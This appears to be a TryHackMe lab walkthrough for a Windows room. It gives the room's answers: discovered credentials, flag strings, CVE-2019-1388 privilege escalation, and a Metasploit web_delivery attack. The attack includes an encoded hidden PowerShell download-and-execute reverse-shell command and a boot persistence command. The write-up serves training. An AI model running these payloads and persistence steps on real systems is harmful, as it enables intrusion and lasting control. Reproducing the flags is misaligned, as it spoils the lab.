## [Task 1] Mission Start!
```
No answer needed
```


## [Task 2] Activate Forward Scanners and Launch Proton Torpedoes

### How many ports are open on our target system?
```
2
```

### Looks like there's a web server running, what is the title of the page we discover when browsing to it?
```
IIS Windows Server
```

### Interesting, let's see if there's anything else on this web server by fuzzing it. What hidden directory do we discover?
```
/retro
```

### Navigate to our discovered hidden directory, what potential username do we discover?
```
wade
```

### Crawling through the posts, it seems like our user has had some difficulties logging in recently. What possible password do we discover?
```
Found on - http://<IP>/retro/index.php/2019/12/09/ready-player-one/#comment-2

parzival
```

### Log into the machine via Microsoft Remote Desktop (MSRDP) and read user.txt. What are it's contents?
```
I am using Arch, so installed `sudo pacman -S remmina` package

Then ran the program
$ remmina

Opens a GUI > fill in the RDP details > Save and connect

THM{HACK_PLAYER_ONE}
```


## [Task 3] Breaching the Control Room

### When enumerating a machine, it's often useful to look at what the user was last doing. Look around the machine and see if you can find the CVE which was researched on this server. What CVE was it?
```
CVE-2019–1388
```

### Looks like an executable file is necessary for exploitation of this vulnerability and the user didn't really clean up very well after testing it. What is the name of this executable?
```
hhupd
```

### Research vulnerability and how to exploit it. Exploit it now to gain an elevated terminal!
```
No answer needed
```

### Now that we've spawned a terminal, let's go ahead and run the command 'whoami'. What is the output of running this?
```
nt authority\system
```

### Now that we've confirmed that we have an elevated prompt, read the contents of root.txt on the Administrator's desktop. What are the contents? Keep your terminal up after exploitation so we can use it in task four!
```
THM{COIN_OPERATED_EXPLOITATION}
```


## [Task 4] Adoption into the Collective

### Return to your attacker machine for this next bit. Since we know our victim machine is running Windows Defender, let's go ahead and try a different method of payload delivery! For this, we'll be using the script web delivery exploit within Metasploit. Launch Metasploit now and select 'exploit/multi/script/web_delivery' for use.
```
No answer needed
```

###	First, let's set the target to PSH (PowerShell). Which target number is PSH?
```
2
```

### After setting your payload, set your lhost and lport accordingly such that you know which port the MSF web server is going to run on and that it'll be running on the TryHackMe network.
```
No answer needed
```

### Finally, let's set our payload. In this case, we'll be using a simple reverse HTTP payload. Do this now with the command: 'set payload windows/meterpreter/reverse_http'. Following this, launch the attack as a job with the command 'run -j'.
```
No answer needed

powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAADsAJABNAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAABsACkAewAkAE0ALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGozAC4AMwA4ADoAOAAwADgAMAAvAGsARwBaAHAAZQBnADkAVwAyAGYAWgBtADEALwBhAGoAMwBHAEgASgBwAFcATwAnACkAKQA7AEkARQBYOgAvAC8AMQAwAC4AOAAuADEAMAAzAC4AMwA4ADoAOAAwADgAMAAvAGsARwBaAHAAZQBnADkAVwAyAGYAWgBtADEAJwApACkAOwA=
```

###	Return to the terminal we spawned with our exploit. In this terminal, paste the command output by Metasploit after the job was launched. In this case, I've found it particularly helpful to host a simple python web server (python3 -m http.server) and host the command in a text file as copy and paste between the machines won't always work. Once you've run this command, return to our attacker machine and note that our reverse shell has spawned. 
```
No answer needed
```

### Last but certainly not least, let's look at persistence mechanisms via Metasploit. What command can we run in our meterpreter console to setup persistence which automatically starts when the system boots? Don't include anything beyond the base command and the option for boot startup. 
```
run persistence -X
```

### Run this command now with options that allow it to connect back to your host machine should the system reboot. Note, you'll need to create a listener via the handler exploit to allow for this remote connection in actual practice. Congrats, you've now gain full control over the remote host and have established persistence for further operations!
```
No answer needed
```

